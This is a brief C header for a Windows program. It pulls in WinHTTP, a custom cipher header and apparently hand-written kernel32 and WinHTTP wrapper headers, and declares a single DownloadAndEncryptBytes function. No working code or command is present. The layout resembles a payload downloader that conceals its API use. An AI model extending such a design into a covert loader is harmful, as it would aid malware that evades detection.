#pragma once


#include "lucky_cipher.h"
#include <windows.h>
#include <winhttp.h>
#include "my_winhttp.h"
#include "my_kernel32.h"

#define ALIGN16(x) (((x) + 15) & ~15)
#define CHUNK_SIZE 4096
#define AES_BLOCK_SIZE 16


unsigned char *DownloadAndEncryptBytes(size_t *outSize);

